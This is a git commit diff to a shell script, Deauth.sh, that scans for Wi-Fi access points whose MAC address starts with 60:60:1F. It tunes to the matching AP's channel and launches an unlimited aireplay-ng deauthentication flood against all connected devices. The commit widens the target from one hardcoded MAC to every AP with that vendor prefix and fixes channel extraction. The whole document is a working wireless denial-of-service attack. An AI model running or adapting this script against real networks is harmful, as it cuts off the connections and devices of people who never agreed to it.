aaa52d37dd975c6c47edbb878f30588d206709ed
Tevon <tjw0018@uah.edu>
2016-12-10 00:35:33 +0000

    We fixed the issue with the regular expression. We fixed the resource busy issue. We also fixed the cut so correct channel can be extracted

--- Scripts/Deauth.sh
+++ Scripts/Deauth.sh
@@ -1,23 +1,24 @@
 #!/bin/sh
 
-	# ifconfig wlan0 down
+	ifconfig wlan0 down
 	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
 	xterm -hold -e airodump-ng -w dump wlan0 & tput setaf 3; echo "Searching for APs...$(tput sgr 0)"	# Scan for APs
 	i=0
 	while [ $i -eq 0 ]
 	do
-		apMAC=$(grep -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-		apCh=$(grep -E "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv | cut -d "," -f 4)
+		apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		apCh=$(grep -m 1 -E "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv | cut -d "," -f 4)
 	# Search and trim MAC
+		ap1stHalf=$(echo $apMAC | cut -c 1-9)	
 
-		if [ "$apMAC" = "60:60:1F:04:74:40" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
+		if [ "$ap1stHalf" = "60:60:1F:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
 			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
 			echo $apMAC
 			i=1
 			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
 		fi	# If MAC not found, search again
 	done
-
+	echo $apCh
 	iwconfig wlan0 channel $apCh
 	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices
 
